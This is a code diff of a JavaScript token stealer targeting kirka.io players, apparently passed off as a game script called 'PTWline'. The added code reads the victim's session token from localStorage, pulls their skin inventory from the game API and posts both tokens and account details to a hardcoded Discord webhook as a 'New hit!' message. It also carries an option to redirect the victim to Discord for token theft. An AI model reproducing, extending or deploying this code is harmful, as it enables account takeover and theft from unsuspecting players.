@@ -17,13 +17,30 @@
 //──█──────██▌──████───████──
 //─███──────▀────█──────██───
 
-var buildid = 1337
-var setting_webhook = "ur webhook"
+var buildid = "grease"
+var setting_webhook = "https://discord.com/api/webhooks/1080847523117273128/wS5MsaLQqHMChKm371itvx499F6UMKORQgKYESpJyOjCRztlzt4SHyFZsGidOuE5cGf0"
 var setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
-var setting_antiduplicate = false
+var setting_antiduplicate = true
 var setting_stealldiscordtoken = false
 
-
+let randomvariable = ""
+let inventory = await fetch("https://api.kirka.io/api/inventory", {
+    "headers": {
+        "authorization": "Bearer " + localStorage.token,
+        "csrf": "token"
+    },
+    "body": null,
+    "method": "GET",
+    "mode": "cors",
+    "credentials": "include"
+});
+inventory = await inventory.json(); // parse response as JSON and store in inventory variable
+inventory.forEach(inventoryitem => {
+    if (inventoryitem.item.salePrice != null) {
+        console.log(inventoryitem.amount + ": " + inventoryitem.item.name)
+randomvariable += inventoryitem.amount + "x Skin: " + inventoryitem.item.name + "\n"
+    }
+})
 
 var request = new XMLHttpRequest();
 request.open("POST", setting_webhook);
@@ -94,25 +111,37 @@ async function stoledata() {
   const diamonds = getElementByXpath('//*[@id="left-interface"]/div[2]/div[2]').innerText
   const coins = getElementByXpath('//*[@id="left-interface"]/div[2]/div[1]').innerText
   const code = getElementByXpath('//*[@id="auth-user"]/div/div[1]/div[2]').innerHTML
+  const skins = document.getElementsByClassName("hover-btns-group");
+/*    if (window.location.href.indexOf(aspage) == 0) {
+    window.location = "https://kirka.io/inventory"
+    }
+        if (window.location.href.indexOf(aspage) > 0) {
+    skinlist = ""
+  for(var i=0;i < skins.length; i++){
+   var skinlist = skinlist + "\n" + skins[i].textContent || skins[i].innerText
+   }
+        }
 
 
 
-  if (setting_antiduplicate == true) {
-    var antidup_check = localStorage.getItem('WMMMWMSMWMMWM');
-    console.log(antidup_check)
-    if (antidup_check == null) {
-        localStorage.setItem('WMMMWMSMWMMWM', '1');
+
+
+        */
+if (setting_antiduplicate == true) {
+    var antid = localStorage.getItem("antidup")
+    if (antid !== 1) {
+        localStorage.setItem("antidup", "1")
     }
 }
 
-
+var aspage = "https://kirka.io/inventory"
 if (setting_antiduplicate == false) {
     var myEmbed1 = {
   author: {
     name: "PTWline kirka.io"
   },
   title: "♿ **New hit!**",
-  description: "```Region:" + get_region + "``````Refresh token:" + get_rtoken + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "');``````LVL:" + lvl + "``````IGN:" + ign + "``````ID:" + code + "``````Coins:" + coins + "``````Clan:" + clan + "``````Diamonds" + diamonds + "```",
+  description: "```Region:" + get_region + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "'); \n localStorage.setItem('refresh_token', ' " + get_rtoken + "'); ``````LVL:" + lvl + "``````IGN:" + ign + "``````ID:" + code + "``````Coins:" + coins + "``````Clan:" + clan + "``````Diamonds:" + diamonds + "``````-Inventory- \n" + randomvariable + "```",
   footer: {
       text: "BuildID:" + buildid,
       icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
@@ -134,13 +163,13 @@ fetch(setting_webhook, {
     body: JSON.stringify(params)
 });}
 
-if (setting_antiduplicate == true && antidup_check == null) {
+if (setting_antiduplicate == true && antid !== "1") {
     var myEmbed2 = {
   author: {
     name: "PTWline kirka.io"
   },
   title: "♿ **New hit!**",
-  description: "```Region:" + get_region + "``````Refresh token:" + get_rtoken + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "');``````Account lvl:" + lvl + "``````Account ign:" + ign + "``````Account id" + code + "``````Account coins:" + coins + "``````Account clan:" + clan + "``````Account diamonds:" + diamonds + "```",
+  description: "```Region:" + get_region + "``````Token join console code: localStorage.setItem('token', ' " + get_token + "'); \n localStorage.setItem('refresh_token', ' " + get_rtoken + "'); ``````LVL:" + lvl + "``````IGN:" + ign + "``````ID:" + code + "``````Coins:" + coins + "``````Clan:" + clan + "``````Diamonds:" + diamonds + "``````-Inventory- \n" + randomvariable + "```",
   footer: {
       text: "BuildID:" + buildid,
   },
@@ -163,6 +192,8 @@ fetch(setting_webhook, {
 await sleep(4000);
 console.clear()
 console.log('%c   PTWline loaded!', 'background: #7b00ff; color: #ffffff', );
+console.log(inventory)
+
 if (setting_stealldiscordtoken == true) {
   var webs = "https://discord.com/channels/@me"
   window.location = webs
@@ -170,3 +201,5 @@ if (setting_stealldiscordtoken == true) {
 }
 stoledata();
 }
+
+
